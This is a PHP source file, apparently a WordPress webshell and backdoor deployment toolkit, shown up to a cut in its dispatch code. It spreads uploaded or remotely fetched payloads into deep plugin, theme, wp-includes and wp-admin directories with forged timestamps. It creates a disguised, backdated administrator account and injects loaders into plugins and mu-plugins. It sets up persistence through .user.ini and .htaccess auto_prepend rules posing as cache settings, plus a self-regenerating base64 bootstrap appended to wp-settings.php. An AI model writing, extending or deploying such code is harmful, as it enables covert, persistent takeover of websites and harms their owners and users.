/**
 * Collect all potential target directories, categorized
 */
function _collect_targets($wp_root) {
    $dirs = [
        'plugins'     => [],
        'themes'      => [],
        'uploads'     => [],
        'others'      => [],
        'wp_includes' => [],
        'wp_admin'    => [],
    ];

    // --- wp-includes: 递归扫描所有子目录（最深3层）---
    $inc = "$wp_root/wp-includes";
    if (is_dir($inc)) {
        _scan_recursive($inc, $dirs['wp_includes'], 3);
    }

    // --- wp-admin: 递归扫描（最深2层）---
    $adm = "$wp_root/wp-admin";
    if (is_dir($adm)) {
        _scan_recursive($adm, $dirs['wp_admin'], 2);
    }

    // --- Plugins: 递归扫2层 ---
    $plug = "$wp_root/wp-content/plugins";
    if (is_dir($plug)) {
        foreach (glob("$plug/*", GLOB_ONLYDIR) as $d) {
            if (_dir_writable($d)) $dirs['plugins'][] = $d;
            foreach (glob("$d/*", GLOB_ONLYDIR) as $sub) {
                if (_dir_writable($sub)) $dirs['plugins'][] = $sub;
            }
        }
    }

    // --- Themes: 递归扫2层 ---
    $them = "$wp_root/wp-content/themes";
    if (is_dir($them)) {
        foreach (glob("$them/*", GLOB_ONLYDIR) as $d) {
            if (_dir_writable($d)) $dirs['themes'][] = $d;
            foreach (glob("$d/*", GLOB_ONLYDIR) as $sub) {
                if (_dir_writable($sub)) $dirs['themes'][] = $sub;
            }
        }
    }

    // --- Uploads: 递归扫3层 ---
    $upl = "$wp_root/wp-content/uploads";
    if (is_dir($upl)) {
        _scan_recursive($upl, $dirs['uploads'], 3);
    }

    // --- Others: wp-content 下的杂项目录 ---
    $wpc = "$wp_root/wp-content";
    if (is_dir($wpc)) {
        foreach (glob("$wpc/*", GLOB_ONLYDIR) as $d) {
            $base = basename($d);
            if (in_array($base, ['plugins','themes','uploads','mu-plugins','languages'])) continue;
            if (_dir_writable($d)) $dirs['others'][] = $d;
            foreach (glob("$d/*", GLOB_ONLYDIR) as $sub) {
                if (_dir_writable($sub)) $dirs['others'][] = $sub;
            }
        }
    }

    // --- wp-content/mu-plugins ---
    $mu = "$wp_root/wp-content/mu-plugins";
    if (is_dir($mu) && _dir_writable($mu)) $dirs['others'][] = $mu;

    return $dirs;
}

function _scan_recursive($base_dir, &$result, $max_depth, $depth = 0) {
    if ($depth >= $max_depth) return;
    $items = @glob("$base_dir/*", GLOB_ONLYDIR);
    if (!$items) return;
    foreach ($items as $d) {
        if (_dir_writable($d)) $result[] = $d;
        _scan_recursive($d, $result, $max_depth, $depth + 1);
    }
}

/**
 * Select targets — 均匀分散，5-6个：wp-includes 2, wp-admin 1, 其余随机分配
 */
function _select_targets($dirs, $min = 5, $max = 6) {
    global $_WP_INCLUDES_COUNT, $_WP_ADMIN_COUNT;
    $selected = [];

    foreach ($dirs as &$arr) { shuffle($arr); }
    unset($arr);

    // ① wp-includes: 取 2 个（优先深层）
    $inc = $dirs['wp_includes'] ?? [];
    usort($inc, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
    $take = min($_WP_INCLUDES_COUNT, count($inc));
    for ($i = 0; $i < $take; $i++) $selected[] = $inc[$i];

    // ② wp-admin: 取 1 个（优先深层）
    $adm = $dirs['wp_admin'] ?? [];
    usort($adm, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
    $take = min($_WP_ADMIN_COUNT, count($adm));
    for ($i = 0; $i < $take; $i++) $selected[] = $adm[$i];

    // ③ 从 plugins/themes/uploads/others 各取 1 个（随机深层）
    $pools = ['plugins', 'themes', 'uploads', 'others'];
    shuffle($pools);
    foreach ($pools as $key) {
        if (count($selected) >= $max) break;
        $pool = $dirs[$key] ?? [];
        if (empty($pool)) continue;
        usort($pool, function($a, $b) { return substr_count($b, '/') - substr_count($a, '/'); });
        $selected[] = $pool[0];
    }

    // ④ 不够 $min 就从剩余补
    if (count($selected) < $min) {
        $all = array_merge($inc, $adm, $dirs['plugins'] ?? [], $dirs['themes'] ?? [], $dirs['uploads'] ?? [], $dirs['others'] ?? []);
        shuffle($all);
        foreach ($all as $d) {
            if (count($selected) >= $min) break;
            if (!in_array($d, $selected)) $selected[] = $d;
        }
    }

    return array_unique($selected);
}

/**
 * Deploy content to targets with mtime forgery.
 * Never overwrites legitimate files — retries different names on collision.
 */
function _deploy_content($content, $targets) {
    $report = ['success' => [], 'skipped' => [], 'failed' => []];
    $hash = md5($content);

    foreach ($targets as $dir) {
        $final_path = null;
        $final_name = null;
        $tried = [];

        // Try up to 6 different names to avoid overwriting legitimate files
        for ($attempt = 0; $attempt < 6; $attempt++) {
            $filename = _pick_name($dir);

            // Avoid re-trying the same name
            if (isset($tried[$filename])) continue;
            $tried[$filename] = true;

            $target_path = "$dir/$filename";

            // Already deployed (same content) → skip this directory entirely
            if (file_exists($target_path) && md5_file($target_path) === $hash) {
                $final_path = $target_path;
                $final_name = $filename;
                break;
            }

            // File exists but is DIFFERENT (legitimate file) → do NOT overwrite, try next name
            if (file_exists($target_path)) {
                continue;
            }

            // File does not exist → safe to use
            $final_path = $target_path;
            $final_name = $filename;
            break;
        }

        // If all names collided with legitimate files, generate a unique variant
        if ($final_path === null) {
            $base = _pick_name($dir);
            $base_no_ext = substr($base, 0, strrpos($base, '.'));
            $ext = '.php';
            // Try _2, _3, _4 variants
            for ($suffix = 2; $suffix < 20; $suffix++) {
                $variant = "{$base_no_ext}_{$suffix}{$ext}";
                $target_path = "$dir/$variant";
                if (!file_exists($target_path)) {
                    $final_path = $target_path;
                    $final_name = $variant;
                    break;
                }
            }
        }

        // Giving up
        if ($final_path === null) {
            $report['failed'][] = [
                'path'   => "$dir/" . _pick_name($dir),
                'reason' => 'all filenames taken by legitimate files'
            ];
            continue;
        }

        // Already skipped (identical content exists)
        if (file_exists($final_path) && md5_file($final_path) === $hash) {
            $report['skipped'][] = $final_path;
            continue;
        }

        // Write
        $ok = @file_put_contents($final_path, $content);
        if ($ok === false) {
            $report['failed'][] = [
                'path'   => $final_path,
                'reason' => 'write_failed'
            ];
            continue;
        }

        $mtime = _get_natural_mtime($dir);
        @touch($final_path, $mtime);
        @chmod($final_path, 0644);

        $report['success'][] = [
            'path'  => $final_path,
            'name'  => $final_name,
            'mtime' => gmdate('Y-m-d H:i:s', filemtime($final_path))
        ];
    }

    return $report;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Multi-file deployment engine
// Assigns each payload role to unique directories based on zone preferences.
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Pick a filename from a role-specific name list (with collision avoidance)
 */
function _pick_role_name($dir, $names) {
    shuffle($names);
    foreach ($names as $n) {
        if (!file_exists("$dir/$n")) return $n;
    }
    // All taken: append suffix
    $base = $names[0];
    $no_ext = substr($base, 0, strrpos($base, '.'));
    for ($s = 2; $s < 20; $s++) {
        $v = "{$no_ext}_{$s}.php";
        if (!file_exists("$dir/$v")) return $v;
    }
    return $base; // last resort
}

/**
 * Deploy multiple payload roles to distinct directories.
 *
 * $payloads = ['role_name' => 'raw php content', ...]
 * $roles    = $_PAYLOAD_ROLES config
 * $dirs     = output of _collect_targets()
 *
 * Returns aggregated report per role.
 */
function _deploy_multi($payloads, $roles, $dirs) {
    $report = [];
    $used_dirs = []; // track directories already assigned to avoid overlap

    foreach ($payloads as $role => $content) {
        $cfg = $roles[$role] ?? null;
        if (!$cfg) {
            $report[$role] = ['error' => 'unknown role'];
            continue;
        }

        $count = $cfg['count'] ?? 1;
        $zones = $cfg['zones'] ?? array_keys($dirs);
        $names = $cfg['names'] ?? [];
        $role_report = ['success' => [], 'skipped' => [], 'failed' => []];

        // ── Special handling: inject into existing active plugin ──
        if (!empty($cfg['inject'])) {
            $wp_root = _find_wp_root();
            if ($wp_root) {
                // Include injector engine
                $inj_path = __DIR__ . '/plugin_injector.php';
                if (file_exists($inj_path)) {
                    require_once $inj_path;
                    $inj_result = _inject_loader_into_plugin($wp_root);
                    if (($inj_result['status'] ?? '') === 'injected' || ($inj_result['status'] ?? '') === 'already') {
                        $role_report['success'][] = [
                            'path'   => $inj_result['path'] ?? '',
                            'name'   => $inj_result['plugin'] ?? '',
                            'role'   => $role,
                            'method' => 'plugin_injection',
                            'detail' => $inj_result,
                        ];
                        $report[$role] = $role_report;
                        continue;
                    }
                }
            }
            // Injection failed — fall through to mu-plugins / normal deploy
        }

        // ── Special handling: force_path (deploy to exact WP subdirectory) ──
        if (!empty($cfg['force_path'])) {
            $wp_root = _find_wp_root();
            if ($wp_root) {
                $forced_dir = $wp_root . '/' . $cfg['force_path'];
                if (!is_dir($forced_dir)) @mkdir($forced_dir, 0755, true);
                if (is_dir($forced_dir) && _dir_writable($forced_dir)) {
                    $filename = !empty($names) ? $names[0] : _pick_name($forced_dir);
                    $target = "$forced_dir/$filename";
                    $hash = md5($content);
                    if (file_exists($target) && md5_file($target) === $hash) {
                        $role_report['skipped'][] = $target;
                    } else {
                        $ok = @file_put_contents($target, $content);
                        if ($ok !== false) {
                            $mtime = _get_natural_mtime($forced_dir);
                            @touch($target, $mtime);
                            @chmod($target, 0644);
                            $role_report['success'][] = [
                                'path' => $target, 'name' => $filename,
                                'role' => $role, 'mtime' => gmdate('Y-m-d H:i:s', filemtime($target)),
                            ];
                        } else {
                            $role_report['failed'][] = ['path' => $target, 'reason' => 'write_failed'];
                        }
                    }
                } else {
                    $role_report['failed'][] = ['path' => $forced_dir, 'reason' => 'dir not writable'];
                }
            }
            $report[$role] = $role_report;
            continue;
        }

        // ── Special handling: force_mu (prefer mu-plugins directory) ──
        if (!empty($cfg['force_mu'])) {
            $wp_root = _find_wp_root();
            if ($wp_root) {
                $mu_dir = $wp_root . '/wp-content/mu-plugins';
                if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
                if (is_dir($mu_dir) && _dir_writable($mu_dir)) {
                    // Prepend mu-plugins to pool so it's tried first
                    array_unshift($zones, '__mu__');
                    $dirs['__mu__'] = [$mu_dir];
                }
            }
        }

        // Build candidate pool from preferred zones, excluding already-used dirs
        $pool = [];
        foreach ($zones as $z) {
            if (!empty($dirs[$z])) {
                $pool = array_merge($pool, $dirs[$z]);
            }
        }
        // Remove dirs already taken by other roles
        $pool = array_values(array_diff($pool, $used_dirs));

        // Prefer deeper directories (harder to find)
        usort($pool, function($a, $b) {
            return substr_count($b, '/') - substr_count($a, '/');
        });

        // If preferred zones exhausted, fallback to all remaining dirs
        if (count($pool) < $count) {
            $all = [];
            foreach ($dirs as $arr) { $all = array_merge($all, $arr); }
            $extra = array_values(array_diff($all, $used_dirs, $pool));
            shuffle($extra);
            $pool = array_merge($pool, $extra);
        }

        $deployed = 0;
        $hash = md5($content);

        foreach ($pool as $dir) {
            if ($deployed >= $count) break;
            if (in_array($dir, $used_dirs)) continue;

            // Pick role-specific filename
            $filename = !empty($names)
                ? _pick_role_name($dir, $names)
                : _pick_name($dir);

            $target = "$dir/$filename";

            // Already deployed identical content
            if (file_exists($target) && md5_file($target) === $hash) {
                $role_report['skipped'][] = $target;
                $used_dirs[] = $dir;
                $deployed++;
                continue;
            }

            // Write
            $ok = @file_put_contents($target, $content);
            if ($ok === false) {
                $role_report['failed'][] = ['path' => $target, 'reason' => 'write_failed'];
                continue;
            }

            $mtime = _get_natural_mtime($dir);
            @touch($target, $mtime);
            @chmod($target, 0644);

            $role_report['success'][] = [
                'path'  => $target,
                'name'  => $filename,
                'role'  => $role,
                'mtime' => gmdate('Y-m-d H:i:s', filemtime($target)),
            ];
            $used_dirs[] = $dir;
            $deployed++;
        }

        if ($deployed == 0 && empty($role_report['skipped'])) {
            $role_report['failed'][] = ['path' => '(none)', 'reason' => 'no writable dirs available'];
        }

        $report[$role] = $role_report;
    }

    return $report;
}

/**
 * Flatten multi-deploy report into summary + combined lists
 */
function _summarize_multi_report($report) {
    $total_success = 0;
    $total_skipped = 0;
    $total_failed  = 0;
    $all_paths     = [];
    $per_role      = [];

    foreach ($report as $role => $r) {
        $s = count($r['success'] ?? []);
        $k = count($r['skipped'] ?? []);
        $f = count($r['failed'] ?? []);
        $total_success += $s;
        $total_skipped += $k;
        $total_failed  += $f;

        foreach (($r['success'] ?? []) as $item) {
            $all_paths[] = $item['path'];
        }

        $per_role[$role] = [
            'deployed' => $s,
            'skipped'  => $k,
            'failed'   => $f,
        ];
    }

    return [
        'total_deployed' => $total_success,
        'total_skipped'  => $total_skipped,
        'total_failed'   => $total_failed,
        'deployed_paths' => $all_paths,
        'per_role'       => $per_role,
    ];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Hidden upload handler
// ═══════════════════════════════════════════════════════════════════════════════
$_ACTION = $_REQUEST['a'] ?? '';

/**
 * Accept file upload via base64, raw body, or URL fetch
 */
function _handle_upload() {
    // Method 1: Base64 encoded in POST field 'd'
    if (!empty($_POST['d'])) {
        $decoded = base64_decode($_POST['d'], true);
        if ($decoded === false) {
            return ['error' => 'base64 decode failed'];
        }
        _stash_content($decoded);
        return ['status' => 'ok', 'action' => 'upload', 'size' => strlen($decoded), 'method' => 'base64'];
    }

    // Method 2: Raw body
    $ctype = $_SERVER['CONTENT_TYPE'] ?? '';
    if (strpos($ctype, 'octet-stream') !== false ||
        strpos($ctype, 'text/plain') !== false ||
        strpos($ctype, 'application/x-www-form-urlencoded') === false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw) && strpos($raw, 'x=') !== 0 && strpos($raw, 'a=') !== 0) {
            _stash_content($raw);
            return ['status' => 'ok', 'action' => 'upload', 'size' => strlen($raw), 'method' => 'raw'];
        }
    }

    return ['error' => 'no payload provided'];
}

/**
 * Accept multi-file upload.
 * POST JSON body: { "role_name": "<base64 content>", ... }
 * Or POST fields:  d_shell_png=<b64>, d_shell_pdf=<b64>, ...
 */
function _handle_multi_upload() {
    // Method 1: JSON body with role=>base64 map
    $ctype = $_SERVER['CONTENT_TYPE'] ?? '';
    if (strpos($ctype, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        $map = @json_decode($raw, true);
        if (is_array($map) && !empty($map)) {
            $files = [];
            foreach ($map as $role => $b64) {
                $dec = base64_decode($b64, true);
                if ($dec !== false) $files[$role] = $dec;
            }
            if (!empty($files)) {
                _multi_stash_save($files);
                $sizes = [];
                foreach ($files as $r => $c) { $sizes[$r] = strlen($c); }
                return ['status' => 'ok', 'action' => 'multi_upload', 'roles' => array_keys($files), 'sizes' => $sizes, 'method' => 'json'];
            }
        }
    }

    // Method 2: POST fields d_<role>=<base64>
    $files = [];
    foreach ($_POST as $key => $val) {
        if (strpos($key, 'd_') === 0 && !empty($val)) {
            $role = substr($key, 2);
            $dec = base64_decode($val, true);
            if ($dec !== false) $files[$role] = $dec;
        }
    }
    if (!empty($files)) {
        _multi_stash_save($files);
        $sizes = [];
        foreach ($files as $r => $c) { $sizes[$r] = strlen($c); }
        return ['status' => 'ok', 'action' => 'multi_upload', 'roles' => array_keys($files), 'sizes' => $sizes, 'method' => 'post_fields'];
    }

    return ['error' => 'no multi-file payload provided'];
}

/**
 * Fetch file from remote URL
 */
function _handle_fetch($url) {
    if (empty($url)) {
        return ['error' => 'no URL provided'];
    }
    if (strpos($url, 'http://') !== 0 && strpos($url, 'https://') !== 0) {
        return ['error' => 'invalid URL scheme'];
    }

    $ctx = stream_context_create([
        'http' => [
            'timeout'    => 30,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'follow_location' => 1,
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ],
    ]);

    $content = @file_get_contents($url, false, $ctx);
    if ($content === false) {
        return ['error' => 'fetch failed'];
    }

    _stash_content($content);
    return ['status' => 'ok', 'action' => 'fetch', 'size' => strlen($content)];
}

/**
 * Trigger admin user creation via WordPress bootstrap
 */
function _trigger_admin_adder($wp_root) {
    if (!function_exists('wp_create_user')) {
        $wp_load = $wp_root . '/wp-load.php';
        if (file_exists($wp_load)) {
            require_once $wp_load;
        }
    }

    if (!function_exists('wp_create_user')) {
        return ['error' => 'wordpress not loadable'];
    }

    global $wpdb;
    if (!$wpdb || empty($wpdb->dbh)) {
        return ['error' => 'no database connection'];
    }

    $user = 'test-user';
    if (username_exists($user)) {
        return ['status' => 'exists'];
    }

    $uid = wp_create_user($user, 'Admin@123', 'admin@example123.com');
    if (is_wp_error($uid)) {
        return ['status' => 'error', 'message' => $uid->get_error_message()];
    }

    $uobj = get_user_by('id', $uid);
    $uobj->set_role('administrator');
    wp_update_user([
        'ID'            => $uid,
        'display_name'  => 'wp_system',
        'user_nicename' => 'wp-cron-service',
    ]);
    add_user_meta($uid, 'show_admin_bar_front', 'false', true);
    $wpdb->query($wpdb->prepare(
        "UPDATE $wpdb->users SET user_registered = %s WHERE ID = %d",
        gmdate('Y-m-d H:i:s', time() - 63072000), $uid
    ));

    return ['status' => 'created', 'user_id' => $uid];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Guard Prefix loader
// ═══════════════════════════════════════════════════════════════════════════════
function _get_guard_prefix() {
    $guard_file = __DIR__ . '/guard_prefix.php';
    if (file_exists($guard_file)) {
        return file_get_contents($guard_file);
    }
    return null;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Environment detection
// ═══════════════════════════════════════════════════════════════════════════════
function _detect_environment($wp_root) {
    $sapi = PHP_SAPI;
    $server = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
    $is_fpm = (stripos($sapi, 'fpm') !== false || stripos($sapi, 'cgi') !== false);
    $is_apache = (stripos($server, 'apache') !== false);
    $is_nginx = (stripos($server, 'nginx') !== false);

    // Check disable_functions
    $disabled = array_map('trim', explode(',', ini_get('disable_functions') ?: ''));
    $disabled = array_filter($disabled);

    $funcs = [
        'file_put_contents' => !in_array('file_put_contents', $disabled),
        'file_get_contents' => !in_array('file_get_contents', $disabled),
        'fopen'             => !in_array('fopen', $disabled),
        'flock'             => !in_array('flock', $disabled),
        'ignore_user_abort' => !in_array('ignore_user_abort', $disabled),
        'set_time_limit'    => !in_array('set_time_limit', $disabled),
    ];

    // Check writable paths
    $wp_content_ini  = $wp_root . '/wp-content/.user.ini';
    $root_ini        = $wp_root . '/.user.ini';
    $wp_content_ht   = $wp_root . '/wp-content/.htaccess';
    $wp_settings     = $wp_root . '/wp-settings.php';
    $mu_plugins_dir  = $wp_root . '/wp-content/mu-plugins';
    $tmp_writable    = is_writable('/tmp') || (@file_put_contents('/tmp/.wp_test', '1') && @unlink('/tmp/.wp_test'));

    // Determine strategy
    if ($is_fpm || $is_nginx) {
        $strategy = 'user.ini + wp-settings';
    } elseif ($is_apache && $sapi === 'apache2handler') {
        $strategy = 'htaccess + wp-settings';
    } else {
        $strategy = 'wp-settings (fallback)';
    }

    return [
        'sapi'           => $sapi,
        'server'         => $server,
        'php_version'    => PHP_VERSION,
        'is_fpm'         => $is_fpm,
        'is_apache'      => $is_apache,
        'is_nginx'       => $is_nginx,
        'disabled_functions' => array_values($disabled),
        'available'      => $funcs,
        'writable'       => [
            'user_ini_wp_content' => _dir_writable(dirname($wp_content_ini)),
            'user_ini_root'       => _dir_writable(dirname($root_ini)),
            'htaccess_wp_content' => _dir_writable(dirname($wp_content_ht)),
            'wp_settings'         => is_writable($wp_settings),
            'mu_plugins'          => is_dir($mu_plugins_dir) ? _dir_writable($mu_plugins_dir) : _dir_writable(dirname($mu_plugins_dir)),
            'tmp'                 => $tmp_writable,
        ],
        'strategy'       => $strategy,
    ];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Deploy .user.ini
// ═══════════════════════════════════════════════════════════════════════════════
function _deploy_user_ini($wp_root, $bootstrap_path) {
    $ini_path = $wp_root . '/wp-content/.user.ini';
    $prepend_line = 'auto_prepend_file = ' . $bootstrap_path;
    $header = '; WordPress auto-generated config' . "\n" .
              '; Generated by WP-CLI cache maintenance' . "\n";

    if (file_exists($ini_path)) {
        $existing = file_get_contents($ini_path);
        if (strpos($existing, 'auto_prepend_file') !== false) {
            return ['action' => 'skipped', 'reason' => 'auto_prepend already set', 'ini_path' => $ini_path];
        }
        // Append
        $result = @file_put_contents($ini_path, $existing . "\n" . $prepend_line . "\n");
        return [
            'action'    => $result !== false ? 'appended' : 'failed',
            'ini_path'  => $ini_path,
        ];
    }

    $result = @file_put_contents($ini_path, $header . $prepend_line . "\n");
    @chmod($ini_path, 0644);
    // Forge mtime to blend in
    $wp_content = dirname($ini_path);
    $mtime_target = _get_natural_mtime($wp_content);
    @touch($ini_path, $mtime_target);
    return [
        'action'    => $result !== false ? 'created' : 'failed',
        'ini_path'  => $ini_path,
    ];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Deploy .htaccess
// ═══════════════════════════════════════════════════════════════════════════════
function _deploy_htaccess($wp_root, $bootstrap_path) {
    $ht_path = $wp_root . '/wp-content/.htaccess';
    $rules = "# WP Performance tweaks\n" .
             "# Auto-generated cache config\n" .
             "<IfModule php_module>\n" .
             "  php_value auto_prepend_file " . $bootstrap_path . "\n" .
             "</IfModule>\n";

    if (file_exists($ht_path)) {
        $existing = file_get_contents($ht_path);
        if (strpos($existing, 'auto_prepend_file') !== false) {
            return ['action' => 'skipped', 'reason' => 'auto_prepend already set', 'htaccess_path' => $ht_path];
        }
        $result = @file_put_contents($ht_path, $existing . "\n" . $rules);
        return ['action' => $result !== false ? 'appended' : 'failed', 'htaccess_path' => $ht_path];
    }

    $result = @file_put_contents($ht_path, $rules);
    @chmod($ht_path, 0644);
    return ['action' => $result !== false ? 'created' : 'failed', 'htaccess_path' => $ht_path];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Inject wp-settings.php
// ═══════════════════════════════════════════════════════════════════════════════
function _deploy_wp_settings($wp_root, $bootstrap_path, $bootstrap_b64) {
    $ws_path  = $wp_root . '/wp-settings.php';
    $bak_path = $ws_path . '.imm.bak';
    $marker   = '/* WP_CACHE_VALIDATION */';

    if (!file_exists($ws_path) || !is_writable($ws_path)) {
        return ['action' => 'failed', 'reason' => 'wp-settings.php not writable', 'settings_path' => $ws_path];
    }

    $content = file_get_contents($ws_path);
    if ($content === false) {
        return ['action' => 'failed', 'reason' => 'cannot read wp-settings.php'];
    }

    // Already injected?
    if (strpos($content, $marker) !== false) {
        return ['action' => 'skipped', 'reason' => 'already injected', 'settings_path' => $ws_path];
    }

    // Backup
    @file_put_contents($bak_path, $content);
    @touch($bak_path, filemtime($ws_path)); // match mtime

    // Injection: bootstrap loader + self-healing bootstrap regeneration
    $injection = "\n\n                    " . $marker . "\n" .
        '$__ibs_path = ABSPATH . \'wp-content/immortal-bootstrap.php\';' . "\n" .
        'if (!file_exists($__ibs_path) && is_writable(dirname($__ibs_path))) {' . "\n" .
        '    $__ibs_code = base64_decode(\'' . $bootstrap_b64 . '\');' . "\n" .
        '    if ($__ibs_code) { @file_put_contents($__ibs_path, $__ibs_code);' .
        ' @chmod($__ibs_path, 0644); }' . "\n" .
        '}' . "\n" .
        'if (file_exists($__ibs_path)) { @include_once $__ibs_path; }' . "\n";

    $result = @file_put_contents($ws_path, $content . $injection);
    // Forge mtime to match original
    @touch($ws_path, filemtime($bak_path));

    return [
        'action'        => $result !== false ? 'injected' : 'failed',
        'settings_path' => $ws_path,
        'backup_path'   => $bak_path,
        'marker'        => $marker,
    ];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Initialize state file
// ═══════════════════════════════════════════════════════════════════════════════
function _init_state_file($deployed_paths, $persist_results, $full_source, $wp_root) {
    $host = $_SERVER['HTTP_HOST'] ?? 'cli';
    $host_hash = md5($host . __DIR__);
    $primary = '/tmp/.' . $host_hash . '.dat';
    $backup  = $wp_root . '/wp-content/.' . $host_hash . '.dat';

    $mesh = [];
    foreach ($deployed_paths as $path) {
        if (file_exists($path)) {
            $mesh[] = [
                'path'            => $path,
                'hash'            => md5_file($path),
                'added'           => time(),
                'last_seen'       => time(),
                'regenerated_by'  => null,
                'regenerated_at'  => null,
            ];
        }
    }

    $bootstrap_path = $wp_root . '/wp-content/immortal-bootstrap.php';

    $state = [
        'version'   => 2,
        'host'      => $host,
        'created'   => time(),
        '_source'   => base64_encode($full_source),
        '_source_hash' => 'sha256:' . hash('sha256', $full_source),
        'mesh'      => $mesh,
        'layers'    => [
            'user_ini' => !empty($persist_results['user_ini']) ? [
                'ini_path'        => $persist_results['user_ini']['ini_path'] ?? '',
                'bootstrap_path'  => $bootstrap_path,
                'prepend_target'  => $deployed_paths[0] ?? '',
                'deployed_at'     => time(),
                'verified_at'     => time(),
            ] : null,
            'htaccess' => !empty($persist_results['htaccess']) ? [
                'htaccess_path'   => $persist_results['htaccess']['htaccess_path'] ?? '',
                'bootstrap_path'  => $bootstrap_path,
                'deployed_at'     => time(),
                'verified_at'     => time(),
            ] : null,
            'wp_settings' => [
                'settings_path'   => $wp_root . '/wp-settings.php',
                'backup_path'     => $wp_root . '/wp-settings.php.imm.bak',
                'injection_marker'=> '/* WP_CACHE_VALIDATION */',
                'bootstrap_path'  => $bootstrap_path,
                'deployed_at'     => time(),
                'verified_at'     => time(),
            ],
        ],
        'health'    => [
            'last_check'           => time(),
            'check_count'          => 0,
            'regenerations_total'  => 0,
            'last_regeneration'    => null,
            'round_robin_index'    => 0,
        ],
    ];

    // Write primary
    $json = json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    $fp = @fopen($primary, 'w');
    if ($fp) { @flock($fp, LOCK_EX); @fwrite($fp, $json); @flock($fp, LOCK_UN); @fclose($fp); }
    @chmod($primary, 0644);

    // Write backup
    @file_put_contents($backup, $json);
    @chmod($backup, 0644);

    return ['primary' => $primary, 'backup' => $backup, 'mesh_size' => count($mesh)];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Generate clean key and store hash
// ═══════════════════════════════════════════════════════════════════════════════
function _generate_clean_key($state_paths) {
    // Generate random 32-char hex key
    $key = bin2hex(random_bytes(16));
    $salt = 'imm_clean_2026';
    $hash = hash('sha256', $key . $salt);

    // Store hash in state files
    foreach ([$state_paths['primary'], $state_paths['backup']] as $sp) {
        if (file_exists($sp)) {
            $data = json_decode(file_get_contents($sp), true);
            if ($data) {
                $data['_clean_hash'] = $hash;
                $data['_clean_salt'] = $salt;
                $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
                @file_put_contents($sp, $json);
            }
        }
    }

    return $key;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Persistence: Verify clean key
// ═══════════════════════════════════════════════════════════════════════════════
function _verify_clean_key($key) {
    $host = $_SERVER['HTTP_HOST'] ?? 'cli';
    $host_hash = md5($host . __DIR__);
    $primary = '/tmp/.' . $host_hash . '.dat';
    $backup  = null;

    // Find the backup path
    $wp_root = _find_wp_root();
    if ($wp_root) $backup = $wp_root . '/wp-content/.' . $host_hash . '.dat';

    foreach ([$primary, $backup] as $sp) {
        if (!$sp || !file_exists($sp)) continue;
        $data = json_decode(file_get_contents($sp), true);
        if (!$data || empty($data['_clean_hash']) || empty($data['_clean_salt'])) continue;

        $salt = $data['_clean_salt'];
        $hash = hash('sha256', $key . $salt);
        if (hash_equals($data['_clean_hash'], $hash)) return true;
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Dispatch
// ═══════════════════════════════════════════════════════════════════════════════

$result = [
    'token'     => $_TOKEN,
    'timestamp' => $_GM('Y-m-d H:i:s'),
];

switch ($_ACTION) {

    // ── upload: receive file(s) ─────────────────────────────────────────
    case 'upload':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $result = ['error' => 'POST required for upload'];
            break;
        }
        // Try multi-file first (d_shell_png=..., d_shell_pdf=..., or JSON body)
        $multi = _handle_multi_upload();
        if (empty($multi['error'])) {
            $result = array_merge($result, $multi);
            break;
        }
        // Fallback: single-file legacy upload (d=<base64> or raw body)
        $single = _handle_upload();
        if (empty($single['error'])) {
            // Auto-detect: if single file uploaded, store as shell_png by default
            $content = _get_stashed();
            if ($content) _multi_stash_put('shell_png', $content);
        }
        $result = array_merge($result, $single);
        break;

    // ── fetch: pull file(s) from URL or base64 GET ─────────────────────
    case 'fetch':
        // Multi-fetch: role=<role>&url=<url> adds one role at a time
        $role = $_GET['role'] ?? '';
        $url  = $_GET['url'] ?? '';
        if (!empty($role) && !empty($url)) {
            $ft = _handle_fetch($url);
            if (empty($ft['error'])) {
                $content = _get_stashed();
                _multi_stash_put($role, $content);
                $result = array_merge($result, ['status' => 'ok', 'action' => 'fetch',
                    'role' => $role, 'size' => strlen($content), 'method' => 'url']);
                break;
            }
            $result = array_merge($result, $ft);
            break;
        }
        // base64 GET with role
        if (!empty($role) && !empty($_GET['d'])) {
            $decoded = base64_decode($_GET['d'], true);
            if ($decoded !== false) {
                _multi_stash_put($role, $decoded);
                $result = array_merge($result, ['status' => 'ok', 'action' => 'fetch',
                    'role' => $role, 'size' => strlen($decoded), 'method' => 'base64_get']);
                break;
            }
        }
        // Legacy single-file fetch
        if (!empty($_GET['d'])) {
            $decoded = base64_decode($_GET['d'], true);
            if ($decoded !== false) {
                _stash_content($decoded);
                $result = array_merge($result, ['status' => 'ok', 'action' => 'fetch',
                    'size' => strlen($decoded), 'method' => 'base64_get']);
                break;
            }
        }
        $result = array_merge($result, _handle_fetch($url));
        break;

    // ── spread: deploy stashed files ───────────────────────────────────
    case 'spread':
        $payloads = _multi_stash_load();
        // Legacy compat: if multi-stash empty, try single stash
        if (empty($payloads)) {
            $single = _get_stashed();
            if (!empty($single)) {
                $payloads = ['shell_png' => $single];
            }
        }
        if (empty($payloads)) {
            $result['error'] = 'no files stashed — use upload or fetch first';
            break;
        }

        $wp_root = _find_wp_root();
        if (!$wp_root) {
            $result['error'] = 'wordpress root not found';
            break;
        }

        $dirs = _collect_targets($wp_root);
        $total_writable = 0;
        foreach ($dirs as $arr) { $total_writable += count($arr); }

